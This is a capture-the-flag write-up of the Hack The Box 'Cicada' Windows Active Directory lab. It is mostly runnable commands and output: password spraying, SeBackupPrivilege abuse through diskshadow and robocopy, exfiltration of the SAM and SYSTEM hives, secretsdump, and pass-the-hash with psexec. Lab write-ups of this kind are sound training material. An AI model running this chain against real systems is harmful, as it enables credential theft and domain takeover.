---
layout: post
title: "HTB: Cicada"
box: cicada
img: /img/cicada/cicada
author: Andrew Cherney
date: 2025-02-15
tags: htb easy-box season-6 windows active-directory smb impacket ldap powershell 
icon: "assets/icons/cicada.png"
post_description: "A quick and easy box showcasing all of the classic steps to perform in Windows boxes inside of an Active Directory environment. If I didn't know any better this box was crafted as the mid-course capstone of some 'Learn to Hack AD' module."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.129.23.187
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.23.187:53
Open 10.129.23.187:88
Open 10.129.23.187:135
Open 10.129.23.187:139
Open 10.129.23.187:389
Open 10.129.23.187:445
Open 10.129.23.187:464
Open 10.129.23.187:636
Open 10.129.23.187:5985
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,88,135,139,389,445,464,636,5985 10.129.23.187

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-28 19:20 UTC
Initiating Ping Scan at 19:20
Scanning 10.129.23.187 [2 ports]
Completed Ping Scan at 19:20, 3.01s elapsed (1 total hosts)
Nmap scan report for 10.129.23.187 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds
```

```bash
nmap -sCV -p53,88,135,139,389,445,464,636,5985 10.129.23.187 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-28 14:22 CDT
Nmap scan report for 10.129.23.187
Host is up (0.062s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 02:23:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time2025-02-15
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time2025-02-15
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m05s
| smb2-time: 
|   date: 2024-09-29T02:23:142025-02-15
|_  start_date: N/A2025-02-15
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.26 seconds
```

## Port 5985

In looking for new webapp ports it does seem this one is responding to the protocol. I'll scan it with dirsearch to find anything. Supposedly winrm uses these ports.

```bash
dirsearch -u http://cicada.htb:5985 -x 403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Cicada/reports/http_cicada.htb_5985/_24-09-28_14-28-48.txt

Target: http://cicada.htb:5985/

[14:28:48] Starting: 
[14:30:27] 405 -    0B  - /wsman
```

Not sure I have noticed this before on a windows machine. I try to invoke a command in the DC through this endpoint:

```bash
pwsh -Command "Invoke-Command -computername CICADA-DC.cicada.htb -ScriptBlock {ipconfig /all}"
Welcome to Parrot OS 

Invoke-Command: MI_RESULT_ACCESS_DENIED
```

Another remnant of windows bulk that I can probably ignore in the future. Back to our regularly scheduled window's methodology starting with smb enumertation.

## SMB

```bash
smbclient --no-pass -L //10.129.23.187

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.23.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
smbclient --no-pass //10.129.23.187/DEV
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```


# User as emily.oscars

## creds for michael.wrightson

### HR share

```bash
smbclient --no-pass //10.129.23.187/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 266707 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
```

```bash
cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Now here we have some default credentials. In active directory environments we can use crackmapexec or similar tools to brute account ids then check that password against all users. In an actual engagement this might take some time depending on the amount of machines or devices on a network, here luckily there is 1 machine and a handful+1 of users.

```bash
crackmapexec smb cicada.htb -u anonymous -p '' --rid-brute
SMB         10.129.23.187   445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.187   445    CICADA-DC        [+] cicada.htb\anonymous: 
SMB         10.129.23.187   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.23.187   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.23.187   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.23.187   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.23.187   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.23.187   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.23.187   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.23.187   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

After shortening this list we are left with:

```
CICADA\john.smoulder
CICADA\sarah.dantelia
CICADA\michael.wrightson
CICADA\david.orelious
CICADA\Dev Support
CICADA\emily.oscars
```

Using crackmapexec again we can now check the pass against each account name for smb. 

```bash
crackmapexec smb 10.129.142.175 -u users -p pass
SMB         10.129.142.175  445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.142.175  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

Maybe now I can view the DEV share?

```bash
smbclient //10.129.142.175/DEV -U 'michael.wrightson'
Enter WORKGROUP\michael.wrightson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

Wishful thinking.

## creds for david.orelious

### ldapdomaindump

Now that I have some credentials I can dump the domain for further investigation. Here in a larger engagement I would be loading up neo4j + bloodhound and determining what users have what permissions on what machines to escalate to higher permission accounts or services. We can start here on a smaller scale with an ldap domain dump which will show all users, devices, groups, and policies on the domain. 

```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' ldap://10.129.142.175
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
ls
 domain_computers_by_os.html   domain_groups.grep   domain_policy.html   domain_trusts.json           domain_users.json     users
 domain_computers.grep         domain_groups.html   domain_policy.json   domain_users_by_group.html  'Notice from HR.txt'
 domain_computers.html         domain_groups.json   domain_trusts.grep   domain_users.grep            pass
 domain_computers.json         domain_policy.grep   domain_trusts.html   domain_users.html            reports
```

The domain users html can be viewed inside of a web browser.

![ldapdomaindump results html]({{ page.img }}_1_domain_users_dumped.png)


## pivoting to emily.oscars

### DEV share

Surely now I can access the DEV share.

```bash
smbclient //10.129.142.175/DEV -U 'david.orelious'
Enter WORKGROUP\david.orelious's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

		4168447 blocks of size 4096. 302480 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```

```bash
cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

More plaintext credentials. This really is like a real active directory environment (I'm half serious here). To connect to windows machines from linux the standard tool is evil-winrm which adds additional functionality past a basic shell, which includes downloading files easily.

```bash
evil-winrm -i 10.129.142.175 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ls
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/28/2024   7:53 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
d96922c9050d2-------------------
```

# Root

## SeBackupPrivilege

A classic oversight in many active directory environments is giving users permissions, or groups they do not need. So it's common to check those first, though bloodhound is normally where I can snoop these valuable permissions/groups. 

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> net users emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 2:20:17 PM
Password expires             Never
Password changeable          8/23/2024 2:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We have effectively already pwned the box at this point. SeBackupPrivilege allows for copying files, any file, which can target SAM, SYSTEM, and SECURITY. After grabbing those secretsdump can be used to dump the hashes on the machine, here it will contain Administrator as it is the DC, in non-DCs there might be other users or service accounts.

I'll use the process to grab the root flag as a poc.

```bash
*Evil-WinRM* PS C:\Users\Public\Music> robocopy C:\Users\Administrator\Desktop C:\Users\Public\Music root.txt /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, September 29, 2024 6:04:32 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\Public\Music\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	C:\Users\Administrator\Desktop\
	    New File  		      34	root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Sunday, September 29, 2024 6:04:32 PM

*Evil-WinRM* PS C:\Users\Public\Music> type root.txt
ba0d5d893ca006------------------
```

Excellent, onto the shell.

## admin hash

This next part is a tiny bit convoluted but simple to understand. We can't dump the SAM and SYSTEM files as it stands right now, we need a workaround in order to grab them. diskshadow.exe is used to create volumes and interactions between them. We can define a volume of C: and give it an alias, then expose that alias to another drive to grab files the default system might not let us grab. 

But to do this there is an issue, diskshadow.exe is an interactive script, meaning our poor shell can't handle interacting with it normally. That why we make a file with the commands we want to run then use that as an argument. After a successful download locally we can use the download command in evil-winrm and then secretsdump as mentioned above to dump the hashes. All together that attack chain looks like:

```bash
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
diskshadow.exe /s c:\TMP\diskshadow.txt
```

Note here download takes absolute paths to the file to download and the location on your local machine.

```bash
robocopy /b Z:\Windows\System32\Config C:\TMP SAM
robocopy /b Z:\Windows\System32\Config C:\TMP SYSTEM
download c:\TMP\SAM /tmp/SAM
download c:\TMP\SYSTEM /tmp/SYSTEM
```

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

With that hash I can make a new winrm session and grab the root flag as nt authority\system.

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341 administrator@10.10.11.35
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.35.....
[*] Found writable share ADMIN$
[*] Uploading file PCYIyTSB.exe
[*] Opening SVCManager on 10.10.11.35.....
[*] Creating service hpoD on 10.10.11.35.....
[*] Starting service hpoD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
